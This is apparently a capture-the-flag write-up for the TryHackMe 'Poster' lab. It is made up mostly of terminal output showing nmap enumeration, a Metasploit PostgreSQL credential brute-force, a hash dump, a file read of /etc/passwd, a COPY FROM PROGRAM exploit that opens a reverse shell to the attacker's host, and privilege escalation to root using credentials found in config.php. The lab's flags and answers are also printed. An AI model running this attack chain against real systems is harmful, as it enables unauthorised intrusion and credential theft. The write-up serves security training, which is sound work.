# Poster

The sys admin set up a rdbms in a safe way.

[Poster](https://tryhackme.com/room/poster)

* Network Enumeration
* Metasploit (postgres_login)
* Metasploit (postgres_sql)
* Metasploit (postgres_hashdump)
* Metasploit (postgres_readfile)
* Metasploit (postgres_copy_from_program_cmd_exec)
* Stored Passwords & Keys
* Misconfigured Binaries

## Task 1 Flag

**What is rdbms?**

Depending on the EF Codd relational model, an RDBMS allows users to build, update, manage, and interact with a relational database, which stores data as a table.

Today, several companies use relational databases instead of flat files or hierarchical databases to store business data. This is because a relational database can handle a wide range of data formats and process queries efficiently. In addition, it organizes data into tables that can be linked internally based on common data. This allows the user to easily retrieve one or more tables with a single query. On the other hand, a flat file stores data in a single table structure, making it less efficient and consuming more space and memory.

Most commercially available RDBMSs currently use Structured Query Language (SQL) to access the database. RDBMS structures are most commonly used to perform CRUD operations (create, read, update, and delete), which are critical to support consistent data management.

Are you able to complete the challenge?
The machine may take up to 5 minutes to boot and configure

```
kali@kali:~/CTFs/tryhackme/Poster$ sudo nmap -p- -sC -sS -sV -O 10.10.187.163
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-09 21:21 CEST
Nmap scan report for 10.10.187.163
Host is up (0.038s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 71:ed:48:af:29:9e:30:c1:b6:1d:ff:b0:24:cc:6d:cb (RSA)
|   256 eb:3a:a3:4e:6f:10:00:ab:ef:fc:c5:2b:0e:db:40:57 (ECDSA)
|_  256 3e:41:42:35:38:05:d3:92:eb:49:39:c6:e3:ee:78:de (ED25519)
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Poster CMS
5432/tcp open  postgresql PostgreSQL DB 9.5.8 - 9.5.10
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2020-07-29T00:54:25
|_Not valid after:  2030-07-27T00:54:25
|_ssl-date: TLS randomness does not represent time
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/9%OT=22%CT=1%CU=30323%PV=Y%DS=2%DC=I%G=Y%TM=5F80B87
OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=105%TI=Z%CI=I%II=I%TS=8)OPS(
OS:O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11
OS:NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(
OS:R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.68 seconds
```

1. What is the rdbms installed on the server?

`postgresql`

3. What port is the rdbms running on?

`5432`

4. Metasploit contains a variety of modules that can be used to enumerate in multiple rdbms, making it easy to gather valuable information.

```
kali@kali:~/CTFs/tryhackme/Poster$ msfconsole -q
msf5 > search postgres

Matching Modules
================

   #   Name                                                        Disclosure Date  Rank       Check  Description
   -   ----                                                        ---------------  ----       -----  -----------
   0   auxiliary/admin/http/manageengine_pmp_privesc               2014-11-08       normal     Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
   1   auxiliary/admin/http/rails_devise_pass_reset                2013-01-28       normal     No     Ruby on Rails Devise Authentication Password Reset
   2   auxiliary/admin/postgres/postgres_readfile                                   normal     No     PostgreSQL Server Generic Query
   3   auxiliary/admin/postgres/postgres_sql                                        normal     No     PostgreSQL Server Generic Query
   4   auxiliary/analyze/crack_databases                                            normal     No     Password Cracker: Databases
   5   auxiliary/scanner/postgres/postgres_dbname_flag_injection                    normal     No     PostgreSQL Database Name Command Line Flag Injection
   6   auxiliary/scanner/postgres/postgres_hashdump                                 normal     No     Postgres Password Hashdump
   7   auxiliary/scanner/postgres/postgres_login                                    normal     No     PostgreSQL Login Utility
   8   auxiliary/scanner/postgres/postgres_schemadump                               normal     No     Postgres Schema Dump
   9   auxiliary/scanner/postgres/postgres_version                                  normal     No     PostgreSQL Version Probe
   10  auxiliary/server/capture/postgresql                                          normal     No     Authentication Capture: PostgreSQL
   11  exploit/linux/postgres/postgres_payload                     2007-06-05       excellent  Yes    PostgreSQL for Linux Payload Execution
   12  exploit/multi/http/manage_engine_dc_pmp_sqli                2014-06-08       excellent  Yes    ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
   13  exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
   14  exploit/multi/postgres/postgres_createlang                  2016-01-01       good       Yes    PostgreSQL CREATE LANGUAGE Execution
   15  exploit/windows/misc/manageengine_eventlog_analyzer_rce     2015-07-11       manual     Yes    ManageEngine EventLog Analyzer Remote Code Execution
   16  exploit/windows/postgres/postgres_payload                   2009-04-10       excellent  Yes    PostgreSQL for Microsoft Windows Payload Execution
   17  post/linux/gather/enum_users_history                                         normal     No     Linux Gather User History


Interact with a module by name or index, for example use 17 or use post/linux/gather/enum_users_history

msf5 >
```

5. After starting Metasploit, search for an associated auxiliary module that allows us to enumerate user credentials. What is the full path of the modules (starting with auxiliary)?

```
use auxiliary/scanner/postgres/postgres_login
msf5 auxiliary(scanner/postgres/postgres_login) >
```

6. What are the credentials you found? example: user:password

```
msf5 auxiliary(scanner/postgres/postgres_login) > set RHOSTS 10.10.187.163
RHOSTS => 10.10.187.163
msf5 auxiliary(scanner/postgres/postgres_login) > run

[!] No active DB -- Credential data will not be saved!
[-] 10.10.187.163:5432 - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password)
[-] 10.10.187.163:5432 - LOGIN FAILED: :tiger@template1 (Incorrect: Invalid username or password)
[-] 10.10.187.163:5432 - LOGIN FAILED: :postgres@template1 (Incorrect: Invalid username or password)
[-] 10.10.187.163:5432 - LOGIN FAILED: :password@template1 (Incorrect: Invalid username or password)
[-] 10.10.187.163:5432 - LOGIN FAILED: :admin@template1 (Incorrect: Invalid username or password)
[-] 10.10.187.163:5432 - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password)
[-] 10.10.187.163:5432 - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)
[-] 10.10.187.163:5432 - LOGIN FAILED: postgres:postgres@template1 (Incorrect: Invalid username or password)
[+] 10.10.187.163:5432 - Login Successful: postgres:password@template1
[-] 10.10.187.163:5432 - LOGIN FAILED: scott:@template1 (Incorrect: Invalid username or password)
[-] 10.10.187.163:5432 - LOGIN FAILED: scott:tiger@template1 (Incorrect: Invalid username or password)
[-] 10.10.187.163:5432 - LOGIN FAILED: scott:postgres@template1 (Incorrect: Invalid username or password)
[-] 10.10.187.163:5432 - LOGIN FAILED: scott:password@template1 (Incorrect: Invalid username or password)
[-] 10.10.187.163:5432 - LOGIN FAILED: scott:admin@template1 (Incorrect: Invalid username or password)
[-] 10.10.187.163:5432 - LOGIN FAILED: admin:@template1 (Incorrect: Invalid username or password)
[-] 10.10.187.163:5432 - LOGIN FAILED: admin:tiger@template1 (Incorrect: Invalid username or password)
[-] 10.10.187.163:5432 - LOGIN FAILED: admin:postgres@template1 (Incorrect: Invalid username or password)
[-] 10.10.187.163:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
[-] 10.10.187.163:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
[-] 10.10.187.163:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
[-] 10.10.187.163:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/postgres/postgres_login) >
```

`postgres:password`

7. What is the full path of the module that allows you to execute commands with the proper user credentials (starting with auxiliary)?
8. Based on the results of #6, what is the rdbms version installed on the server?

```
msf5 auxiliary(scanner/postgres/postgres_login) > use auxiliary/admin/postgres/postgres_sql
msf5 auxiliary(admin/postgres/postgres_sql) > show options

Module options (auxiliary/admin/postgres/postgres_sql):

   Name           Current Setting   Required  Description
   ----           ---------------   --------  -----------
   DATABASE       template1         yes       The database to authenticate against
   PASSWORD       postgres          no        The password for the specified username. Leave blank for a random password.
   RETURN_ROWSET  true              no        Set to true to see query result sets
   RHOSTS                           yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          5432              yes       The target port
   SQL            select version()  no        The SQL query to execute
   USERNAME       postgres          yes       The username to authenticate as
   VERBOSE        false             no        Enable verbose output

msf5 auxiliary(admin/postgres/postgres_sql) > set RHOSTS 10.10.187.163
RHOSTS => 10.10.187.163
msf5 auxiliary(admin/postgres/postgres_sql) > set password password
password => password
msf5 auxiliary(admin/postgres/postgres_sql) > run
[*] Running module against 10.10.187.163

Query Text: 'select version()'
==============================

    version
    -------
    PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit

[*] Auxiliary module execution completed
msf5 auxiliary(admin/postgres/postgres_sql) >
```

9.  What is the full path of the module that allows for dumping user hashes (starting with auxiliary)?

`auxiliary/scanner/postgres/postgres_hashdump`

10. How many user hashes does the module dump?

```
msf5 auxiliary(admin/postgres/postgres_sql) > use auxiliary/scanner/postgres/postgres_hashdump
msf5 auxiliary(scanner/postgres/postgres_hashdump) > show options

Module options (auxiliary/scanner/postgres/postgres_hashdump):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  postgres         yes       The database to authenticate against
   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
   RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     5432             yes       The target port
   THREADS   1                yes       The number of concurrent threads (max one per host)
   USERNAME  postgres         yes       The username to authenticate as

msf5 auxiliary(scanner/postgres/postgres_hashdump) > set rhosts 10.10.187.163
rhosts => 10.10.187.163
msf5 auxiliary(scanner/postgres/postgres_hashdump) > set password password
password => password
msf5 auxiliary(scanner/postgres/postgres_hashdump) > run

[+] Query appears to have run successfully
[+] Postgres Server Hashes
======================

 Username   Hash
 --------   ----
 darkstart  md58842b99375db43e9fdf238753623a27d
 poster     md578fb805c7412ae597b399844a54cce0a
 postgres   md532e12f215ba27cb750c9e093ce4b5127
 sistemas   md5f7dbc0d5a06653e74da6b1af9290ee2b
 ti         md57af9ac4c593e9e4f275576e13f935579
 tryhackme  md503aab1165001c8f8ccae31a8824efddc

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/postgres/postgres_hashdump) >
```

`6`

11. What is the full path of the module (starting with auxiliary) that allows an authenticated user to view files of their choosing on the server?

```
msf5 auxiliary(scanner/postgres/postgres_hashdump) > use auxiliary/admin/postgres/postgres_readfile
msf5 auxiliary(admin/postgres/postgres_readfile) > show options 

Module options (auxiliary/admin/postgres/postgres_readfile):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  template1        yes       The database to authenticate against
   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
   RFILE     /etc/passwd      yes       The remote file
   RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     5432             yes       The target port
   USERNAME  postgres         yes       The username to authenticate as
   VERBOSE   false            no        Enable verbose output

msf5 auxiliary(admin/postgres/postgres_readfile) > set RHOSTS 10.10.187.163
RHOSTS => 10.10.187.163
msf5 auxiliary(admin/postgres/postgres_readfile) > set PASSWORD password
PASSWORD => password
msf5 auxiliary(admin/postgres/postgres_readfile) > run
[*] Running module against 10.10.187.163

Query Text: 'CREATE TEMP TABLE jbSGTotEY (INPUT TEXT);
      COPY jbSGTotEY FROM '/etc/passwd';
      SELECT * FROM jbSGTotEY'
==============================================================================================================================

    input
    -----
    #/home/dark/credentials.txt
    _apt:x:105:65534::/nonexistent:/bin/false
    alison:x:1000:1000:Poster,,,:/home/alison:/bin/bash
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    dark:x:1001:1001::/home/dark:
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    messagebus:x:106:110::/var/run/dbus:/bin/false
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    postgres:x:109:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    root:x:0:0:root:/root:/bin/bash
    sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    syslog:x:104:108::/home/syslog:/bin/false
    systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
    systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
    systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
    systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    uuidd:x:107:111::/run/uuidd:/bin/false
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

#/home/dark/credentials.txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
alison:x:1000:1000:Poster,,,:/home/alison:/bin/bash
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
postgres:x:109:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
dark:x:1001:1001::/home/dark:
[+] 10.10.187.163:5432 Postgres - /etc/passwd saved in /home/kali/.msf4/loot/20201009213251_default_10.10.187.163_postgres.file_260620.txt
[*] Auxiliary module execution completed
msf5 auxiliary(admin/postgres/postgres_readfile) >
```

12. What is the full path of the module that allows arbitrary command execution with the proper user credentials (starting with exploit)?

```
msf5 auxiliary(admin/postgres/postgres_readfile) > use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
[*] Using configured payload cmd/unix/reverse_perl
msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > show options 

Module options (exploit/multi/postgres/postgres_copy_from_program_cmd_exec):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   DATABASE           template1        yes       The database to authenticate against
   DUMP_TABLE_OUTPUT  false            no        select payload command output from table (For Debugging)
   PASSWORD           postgres         no        The password for the specified username. Leave blank for a random password.
   RHOSTS                              yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT              5432             yes       The target port (TCP)
   TABLENAME          WaGFGJFoDn       yes       A table name that does not exist (To avoid deletion)
   USERNAME           postgres         yes       The username to authenticate as


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set RHOSTS 10.10.187.163
RHOSTS => 10.10.187.163
msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set PASSWORD password
PASSWORD => password
msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set LHOST 10.8.106.222
LHOST => 10.8.106.222
msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > run

[*] Started reverse TCP handler on 10.8.106.222:4444 
[*] 10.10.187.163:5432 - 10.10.187.163:5432 - PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit
[*] 10.10.187.163:5432 - Exploiting...
[+] 10.10.187.163:5432 - 10.10.187.163:5432 - WaGFGJFoDn dropped successfully
[+] 10.10.187.163:5432 - 10.10.187.163:5432 - WaGFGJFoDn created successfully
[+] 10.10.187.163:5432 - 10.10.187.163:5432 - WaGFGJFoDn copied successfully(valid syntax/command)
[+] 10.10.187.163:5432 - 10.10.187.163:5432 - WaGFGJFoDn dropped successfully(Cleaned)
[*] 10.10.187.163:5432 - Exploit Succeeded
[*] Command shell session 1 opened (10.8.106.222:4444 -> 10.10.187.163:59376) at 2020-10-09 21:34:33 +0200

whoami
postgres
python3 -c "import pty;pty.spawn('/bin/bash')"
postgres@ubuntu:/var/lib/postgresql/9.5/main$ id
id
uid=109(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)
postgres@ubuntu:/var/lib/postgresql/9.5/main$ find / -type f -name user.txt 2>/dev/null
<stgresql/9.5/main$ find / -type f -name user.txt 2>/dev/null                
/home/alison/user.txt
postgres@ubuntu:/var/lib/postgresql/9.5/main$ cat /home/alison/user.txt
cat /home/alison/user.txt
cat: /home/alison/user.txt: Permission denied
postgres@ubuntu:/var/lib/postgresql/9.5/main$ cd /var/www/html/
cd /var/www/html/
postgres@ubuntu:/var/www/html$ ls 
ls
config.php  poster
postgres@ubuntu:/var/www/html$ cat config.php 
cat config.php 
<?php 

        $dbhost = "127.0.0.1";
        $dbuname = "alison";
        $dbpass = "p4ssw0rdS3cur3!#";
        $dbname = "mysudopassword";
?>postgres@ubuntu:/var/www/html$
```

13. Compromise the machine and locate user.txt

```
postgres@ubuntu:/var/www/html$ su alison
su alison
Password: mysudopassword

su: Authentication failure
postgres@ubuntu:/var/www/html$ su alison
su alison
Password: p4ssw0rdS3cur3!#

alison@ubuntu:/var/www/html$ cat /home/alison/user.txt
cat /home/alison/user.txt
THM{postgresql_fa1l_conf1gurat1on}
alison@ubuntu:/var/www/html$
```

14. Escalate privileges and obtain root.txt

```
alison@ubuntu:/var/www/html$ sudo -l
sudo -l
[sudo] password for alison: p4ssw0rdS3cur3!#

Matching Defaults entries for alison on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alison may run the following commands on ubuntu:
    (ALL : ALL) ALL
alison@ubuntu:/var/www/html$ sudo -s
sudo -s
root@ubuntu:/var/www/html# cat /root/root.txt
cat /root/root.txt
THM{c0ngrats_for_read_the_f1le_w1th_credent1als}
root@ubuntu:/var/www/html#
```
